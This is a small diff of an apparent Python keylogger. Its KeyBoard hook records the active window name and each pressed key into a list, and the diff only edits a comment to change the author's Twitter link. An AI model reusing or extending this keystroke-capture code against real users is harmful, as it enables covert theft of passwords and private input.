@@ -17,7 +17,7 @@ import socket
 
 def KeyBoard(event):
     list.append(event.WindowName)                               # My Linkedin Account ==> "https://www.linkedin.com/in/eredotpkfr/"
-    list.append("     0=={:::::::::::::::>     ")               # My Twitter Account ==> "https://twitter.com/YoksulErdogan"
+    list.append("     0=={:::::::::::::::>     ")               # My Twitter Account ==> "https://twitter.com/eredot_pkfr"
     list.append(event.Key)                                      # My GitHub Account ==> "https://github.com/eredotpkfr"
     list.append("\n")                                           # My İnstagram Account ==> "https://www.instagram.com/eredot_pk.fr/?hl=tr"
     return True                                                 # Follow Me On My Blog (https://www.erdoganyoksul.com/)
